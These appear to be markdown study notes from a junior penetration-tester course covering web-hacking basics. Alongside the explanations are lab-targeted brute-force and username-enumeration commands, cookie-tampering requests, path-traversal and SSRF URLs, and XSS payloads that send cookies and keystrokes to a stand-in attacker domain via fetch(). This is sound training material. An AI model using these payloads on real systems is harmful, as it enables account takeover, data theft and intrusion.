# Jr Penetration Tester

1. [Introduction to Pentesting](#introduction-to-pentesting)
2. [Introduction to Web Hacking](#introduction-to-web-hacking)
3. [Burp Suite](#burp-suite)
4. [Network Security](#network-security)
5. [Vulnerability Research](#vulnerability-research)
6. [Metasploit](#metasploit)
7. [Privilege Escalation](#privilege-escalation)

## Introduction to Pentesting

---

* Pentest (Penetration test) - ethical attempt to test & analyze security to protect assets; involves using tools and techniques to attempt breaking the system; authorised audit.

* ROE (Rules of Engagement) - document created at initial stages of pentest, includes permission, test scope and rules.

* Stages of pentest:

  1. Information gathering
  2. Enumeration, scanning
  3. Exploitation
  4. Privilege escalation
  5. Post-exploitation (pivoting, covering tracks, reporting)

* Pentest methodologies:

  * OSSTMM (Open Source Security Testing Methodology Manual)
  * OWASP (Open Web Application Security Project)
  * NIST (National Institute of Standards and Technology) Cybersecurity Framework
  * NCSC CAF (National Cyber Security Centre - Cyber Assessment Framework)

* Types of pentests:

  * Black-box testing - No knowledge; high-level process
  * Grey-box testing - Partial knowledge
  * White-box testing - Full knowledge; low-level process

* CIA triad - Confidentiality, Integrity and Availability.

* PIM (Privileged Identity Management) - used to translate a user's role within an organisation into an access role on a system.

* PAM (Privileged Access Management) - management of privileges a system's access role has.

* Threat modelling - process of reviewing, improving and testing security protocols in place in an organisation's IT infra and services.

* A threat model includes:

  * Threat intelligence
  * Asset identification
  * Mitigation capabilities
  * Risk assessment

## Introduction to Web Hacking

---

* We can manually review a web app for security issues using in-built tools in our browser, such as View Source, Inspector, Debugger, Network, etc.

* The three methods of Content Discovery in web apps are:
  
  * Manual -

    ```shell
    #We can use the favicon link of a website to find the framework used
    curl https://website.com/favicon.ico | md5sum
    #this calculates md5 hash value after downloading the favicon
    #hash can be used to lookup on <https://wiki.owasp.org/index.php/OWASP_favicon_database>
    ```

    ```shell
    #Manually discovering HTTP headers
    curl http://website.com/ -v
    ```

  * Automated -

    ```shell
    #using wordlists
    #common tools are ffuf, dirb, gobuster - all do the same function
    ffuf -w /usr/share/wordlists/dirbuster.txt -u http://10.0.2.7/FUZZ

    dirb http://10.0.2.7/ /usr/share/wordlists/dirbuster.txt

    gobuster dir --url http://10.0.2.7/ -w /usr/share/wordlists/dirbuster.txt
    ```

  * OSINT (Open Source Intelligence) - OSINT includes methods such as advanced Google searching, checking archives or using applications such as Wappalyzer and S3 buckets.

* Subdomain enumeration - finding valid subdomains for a domain. Its methods are:

  * OSINT - using public info with the help of sites such as <http://crt.sh/> and <https://transparencyreport.google.com/https/certificates> to get a list of SSL/TLS certificates and discover subdomains. OSINT includes advanced Googling as well as using automated tools like ```Sublist3r```

  * Bruteforce - bruteforce DNS enumeration is trying different possible subdomains from a list of commonly used ones. As it involves a high number of requests, it is automated using tools such as ```dnsrecon```.

  * Virtual hosts - as some subdomains are not always hosted in public DNS results and are instead stored in private DNS server or in developer's machines in '/etc/hosts' file, we can use the Host header when accessing websites and modify it. This process can be automated too.

    ```shell
    ffuf -w /usr/share/wordlists/dnsnamelist.txt -H "Host:FUZZ.acmeitsupport.thm" -u http://10.10.3.35 -fs {size} #replace {size} with any page size
    #-H flag is used for header
    #-fs is used for filtering output by page size
    ```

* Authentication bypass:

  * Username enumeration -

    ```shell
    #a list of valid usernames can be created on basis of error message
    ffuf -w /usr/share/wordlists/names.txt -X POST -d "username=FUZZ&email=x&password=x" -H "Content-Type:application/x-www-form-urlencoded" -u http://10.10.131.237/customers/signup -mr "username already exists"
    #-X specifies request method
    #-d is for data that we will send
    #-H is for extra headers added to request
    #-mr is the text or error we are looking for a valid username
    ```

  * Brute force -

    ```shell
    #we can use valid usernames to brute force login pages
    ffuf -w valid_usernames.txt:W1, /usr/share/wordlists/passwords.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.131.237/customers/login -fc 200
    #multiple wordlists, so instead of using FUZZ we have to use custom terms
    #-fc is used for status code other than 200, for positive match
    ```

  * Logic flaw - typical logical path of app is bypassed, circumvented or manipulated.

  * Cookie tampering - For plaintext cookies, we can simply modify cookies. For hashed cookies, however, we have to use resources such as <https://crackstation.net/>. If the cookies are encoded using base32 or base64, we can simply decode, modify and encode the cookie string to bypass login.

    ```shell
    curl http://10.10.131.237/cookie-test #returns message 'Not Logged In'

    curl -H "Cookie: logged_in=true;admin=false" http://10.10.131.237/cookie-test #logged in

    curl -H "Cookie: logged_in=true;admin=true" http://10.10.131.237/cookie-test #logged in as Admin
    ```

* IDOR (Insecure Direct Object Reference) - a type of access control vulnerability; occurs when a web server receives user input to retrieve objects without validation on server-side to confirm the requested object belongs to the one requesting it. Examples include:

  * Websites such as <https://website.com/profile?userid=1002>, where the userid field can be manipulated.

  * Data being sent to server is encoded using base64. In these instances, we can simply decode and encode modified data and submit it.

  * Hashing IDs; if they are predictable, they can be cracked using services like <https://crackstation.net/>.

  * IDOR detection by creating two accounts on the same website, and swapping the IDs between them. If the other users' content can be viewed using their ID but not by logging into their account, then it is a valid IDOR vulnerability.

* File inclusion vulnerabilities:

  * Local File Inclusion (LFI) -

    * due to lack of security awareness in developers, PHP functions such as ```include```, ```require```, ```include_once```, ```require_once``` can cause this vulnerability.

    * Examples include changing URL to <http://webapp.thm/get.php?file=/etc/passwd> (this would work when no directories are specified in functions) and transforming URL to <http://webapp.thm/index.php?lang=../../../../etc/passwd> (similar to path traversal).

  * Remote File Inclusion (RFI) -

    * to include remote files into a vulnerable app, this is also due to improper sanitation of user input.

    * requirement for RFI is that ```allow_url_fopen``` should be on, because external URL has to be injected using include.

    * higher risk as it can allow to gain RCE (Remote Command Execution), do sensitive info disclosure or other attacks such as XSS and DoS.

  * Directory traversal (path traversal or dot-dot-slash attack) -
  
    * allows attacker to read OS resources, local files on the server by manipulating web app's URL to access directories outside root directory.

    * occur when user's input is passed to a function (e.g. - ```file_get_contents``` in PHP).

    * poor input validation or filtering can also cause this:

    * Examples include modifying <http://webapp.thm/get.php?file=usercv.pdf> to <http://webapp.thm/get.php?file=../../../../etc/passwd>, or for a Windows machine, it can be changing the link into <http://webapp.thm/get.php?file=../../../../boot.ini> or <http://webapp.thm/get.php?file=../../../../windows/win.ini>

* SSRF (Server Side Request Forgery) - vulnerability that allows user to cause webserver make an extra or edited HTTP request to any resource that attacker wants. There are 2 types of SSRF vulnerability - one is regular, where data is returned to attacker's screen; another type is blind SSRF, in which SSRF occurs but no info is returned to screen. Examples include:

  * Expected request - <http://website.thm/stock?url=http://api.website.thm/api/stock/item?id=123>

    Modified request - <http://website.thm/stock?url=http://api.website.thm/api/user>

    Website requests - <http://api.website.thm/api/user>

  * Expected request - <http://website.thm/stock?url=/item?id=123>

    Modified request - <http://website.thm/stock?url=/../user>

    Website requests - <http://api.website.thm/api/stock/../user> (gives /api/user)

  * Expected request - <http://website.thm/stock?server=api&id=123>

    Modified request - <http://website.thm/stock?server=api.website.thm/api/user&x=&id=123>
    (&x= is a payload here, to stop remaining path appending to URL, instead it turns it into a parameter)

    Website requests - <http://api.website.thm/api/user?x=.website.thm/api/stock/item?id=123>

  * Expected request - <http://website.thm/stock?url=http://api.website.thm/api/stock/item?id=123>

    Modified request - <http://website.thm/stock?url=http://hacker.domain.thm/>
    (this helps in capturing request headers sent to attacker's domain, and the headers could contain authentication credentials or API keys)

    Website requests - <http://hacker.domain.thm/>
  
  * Possible SSRF vulnerabilities, can be discovered with <https://requestbin.com/> too -

    * When full URL is used in a parameter in address bar

    * A hidden field in a form

    * A partial URL like just the hostname

    * Only path of URL

* XSS (Cross-Site Scripting) - Injection attack where malicious JS gets injected into web app for other users to execute. Examples -

  * Proof of concept:

    ```js
    <script>
      alert('XSS');
    </script>
    ```
  
  * Session stealing:

    ```js
    <script>
      fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));
    </script>
    ```

  * Key Logger:

    ```js
    <script>
      document.onkeypress = function(e) {fetch('https://hacker.thm/log?key=' + btoa(e.key));}
    </script>
    ```

  * Business Logic:

    ```js
    <script>
      user.changeEmail('attacker@hacker.thm'); //a particular function is called
    </script>
    ```

* Types of XSS:

  1. Reflected XSS - user-supplied data in HTTP request is included in webpage source without validation. It can be tested at every point of entry, including parameters in URL and URL file path.

  2. Stored XSS - payload is stored on the web app and then gets run when users visit the page. It can be tested at every point of entry where data can be stored, like comments on a blog, user profile information, etc.

  3. DOM-Based XSS - JS execution happens directly in browser without loading pages or submitting data. It happens when JS code acts as input or user interaction. Examples can be using the 'window.location.x' parameters for the attacker to gain control, or unsafe methods such as 'eval()'.

  4. Blind XSS - similar to stored XSS, but we cannot see the payload working. To test for blind XSS, we need to ensure the payload has a call-back (like a HTTP request) to know if code is getting executed. Tools like ```xsshunter``` can be used for blind XSS attacks.

* XSS polyglot - string of text which can escape attributes, tags and bypass filters all in one. Example - ```jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e```

## Burp Suite

---

## Network Security

---

## Vulnerability Research

---

## Metasploit

---

## Privilege Escalation

---
